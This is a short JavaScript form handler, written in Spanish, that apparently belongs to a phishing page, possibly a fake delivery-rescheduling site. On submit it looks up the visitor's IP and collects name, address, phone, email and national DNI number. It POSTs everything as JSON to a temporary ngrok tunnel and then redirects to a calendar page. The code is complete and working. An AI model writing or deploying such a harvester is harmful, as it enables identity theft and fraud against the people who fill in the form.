document.getElementById("direccionForm").addEventListener("submit", async function(e) {
  e.preventDefault();

  // Obtener IP
  let ip = 'Desconocida';
  try {
    const res = await fetch('https://api.ipify.org?format=json');
    const data = await res.json();
    ip = data.ip;
  } catch (err) {
    console.warn("No se pudo obtener la IP.");
  }

  const form = e.target;
  const datos = {
    nombre: form.nombre.value,
    apellidos: form.apellidos.value,
    direccion: form.direccion.value,
    numero: form.numero.value,
    piso: form.piso.value,
    ciudad: form.ciudad.value,
    provincia: form.provincia.value,
    codigoPostal: form.codigoPostal.value,
    telefono: form.telefono.value,
    email: form.email.value,
    dni: form.dni.value,
    ip: ip
  };

  try {
    const respuesta = await fetch("https://discrete-guppy-evenly.ngrok-free.app/datos", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(datos)
    });

    if (respuesta.ok) {
      
      window.location.href = "programar-calendario.html";
    } else {
      alert("Error al enviar los datos");
    }
  } catch (err) {
    alert("Error de conexión: " + err);
  }
});